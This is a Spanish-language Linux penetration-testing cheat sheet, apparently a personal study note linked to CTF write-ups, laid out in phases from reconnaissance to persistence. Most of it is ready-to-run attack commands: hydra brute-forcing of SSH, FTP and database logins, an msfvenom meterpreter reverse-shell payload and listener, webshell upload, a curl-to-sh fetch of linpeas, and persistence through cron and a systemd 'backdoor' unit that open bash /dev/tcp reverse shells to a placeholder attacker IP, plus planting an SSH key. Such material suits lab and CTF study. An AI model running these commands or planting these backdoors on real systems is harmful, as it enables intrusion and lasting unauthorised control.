

> [!info] Objetivo
> Guía concisa para explotar máquinas Linux desde el reconocimiento hasta la escalada.

---

## Fase 1: Reconocimiento

> [!tip] Descubrir hosts y servicios

```bash
# Descubrir hosts
nmap -sn <target>/24

# Escaneo completo
nmap -sC -sV -O -p- <target>

# Scripts de enumeración
nmap -sC -sV -sU -p- <target> # UDP
```

---

## Fase 2: Enumeración

> [!important] Encontrar vectores de ataque

### Servicios Web

```bash
# Directorios
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://<target>

# Fuzzing recursivo
feroxbuster -u http://<target> -r

# Parámetros
ffuf -u "http://<target>/page?FUZZ=test" -w params.txt
```

### SSH

```bash
# Banner grab
nmap -sV -p 22 <target>

# Fuerza bruta
hydra -l root -P passwords.txt ssh://<target>
```

### FTP

```bash
# Conexión anónima
nmap -sV -p 21 <target>
ftp anonymous@<target>

# Fuerza bruta
hydra -l admin -P passwords.txt ftp://<target>
```

### SMB

```bash
# Enumeración
smbclient -L //<target> -N
enum4linux -a //<target>
nmap -p 445 --script smb-enum-shares,smb-enum-users <target>
```

### MySQL/PostgreSQL

```bash
# Conexión
mysql -h <target> -u root -p
psql -h <target> -U postgres

# Fuerza bruta
hydra -l root -P passwords.txt mysql://<target>
hydra -l postgres -P passwords.txt postgres://<target>
```

---

## Fase 3: Explotación

> [!danger] Obtener acceso

### Reverse Shell

```bash
# Generar payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f elf -o shell

# Escuchar
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <tu_ip>; set LPORT 4444; run"
```

### Web Shell

```bash
# Subir webshell
upload shell.php /var/www/html/

# Conectar
curl http://<target>/shell.php?cmd=whoami
```

### Explotar Servicios

```bash
# Metasploit
search <servicio>
use exploit/<ruta>
set RHOSTS <target>
run

# Scripts NSE
nmap --script <script> -p <puerto> <target>
```

---

## Fase 4: Escalada de Privilegios

> [!warning] Conseguir root

### Diagnóstico

```bash
# Información del sistema
uname -a
cat /etc/os-release

# Usuario actual
id
whoami

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Sudo permissions
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Capabilities
getcap -r / 2>/dev/null
```

### Técnicas Comunes

| Vector          | Herramienta                        |               |
| --------------- | ---------------------------------- | ------------- |
| SUID binaries   | [[Linux#Permisos y Propietarios    | find, chmod]] |
| Sudo abuse      | `sudo -l`                          |               |
| Cron jobs       | Editar scripts ejecutados por root |               |
| Kernel exploit  | SearchSploit                       |               |
| Capabilities    | getcap                             |               |
| PATH abuse      | Script en directorio no protegido  |               |
| NFS root squash | Montar sistema de archivos         |               |

### Herramientas

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

---

## Fase 5: Persistencia

> [!note] Mantener acceso

```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'" | crontab -

# SSH key
echo "<tu_public_key>" >> ~/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
```

---

#checklist
- [ ] Reconocimiento completado
- [ ] Servicios enumerados
- [ ] Vector de ataque identificado
- [ ] Acceso obtenido
- [ ] Escalada de privilegios completada
- [ ] Persistencia configurada

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../write-ups/Nike-THL.md|Nike-THL]]— Escalada de Privilegios, Linux, SSH
- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]]— Escalada de Privilegios, Linux, SSH
- [[../../informes/Informe_Nike.md|Informe_Nike]]— Linux, Netcat / Reverse Shells, SSH
- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]]— Escalada de Privilegios, Netcat / Reverse Shells, SSH
- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]]— Escalada de Privilegios, Linux, SSH
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]]— Escalada de Privilegios, Netcat / Reverse Shells, Reverse Shells

### 🛠️ Herramientas

- [[comandos/Netcat|Netcat / Reverse Shells]]
- [[comandos/SSH|SSH]]

> #escalada-privilegios #linux #netcat #reverse-shell #ssh
